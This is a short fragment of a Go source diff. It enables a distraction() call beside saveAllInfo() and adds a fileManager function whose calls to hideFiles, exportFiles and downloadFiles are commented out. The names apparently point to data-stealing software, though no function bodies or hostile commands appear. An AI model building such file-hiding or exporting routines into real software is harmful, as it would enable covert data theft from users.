@@ -23,8 +23,12 @@ import (
 )
 
 func main() {
-	// distraction()
+	distraction()
 	saveAllInfo()
+	// fileManger()
+}
+
+func fileManager() {
 	// hideFiles()
 	// exportFiles()
 	// downloadFiles()
